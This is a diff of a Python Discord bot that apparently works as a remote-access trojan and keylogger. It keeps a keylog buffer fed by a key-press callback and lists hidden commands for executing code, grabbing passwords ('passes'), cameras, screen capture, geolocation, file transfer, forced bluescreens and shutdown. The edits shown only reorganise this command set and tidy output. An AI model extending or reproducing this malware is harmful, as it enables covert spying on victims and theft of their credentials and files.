@@ -8,8 +8,8 @@ else:
 from colorama import Fore, Style
 import time
 time.sleep(1)
+print(Style.RESET_ALL)
 ASCII = """
-
 
 
 
@@ -145,10 +145,11 @@ intents.typing = True
 
 # Create the bot with intents
 bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
-slash = discord.app_commands.CommandTree(client)
 
 # Buffer to store keylog data
 keylog_buffer = []
+
+hidden_commands = {"winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
 
 # Callback function for key press events
 def on_press(key):
@@ -513,7 +514,6 @@ def format_devices(devices):
 @bot.command(help="Displays this message")
 async def help(ctx, category: str = None):
     embed_pages = []
-    hidden_commands = {"url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
 
     if category == "hidden":
         commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
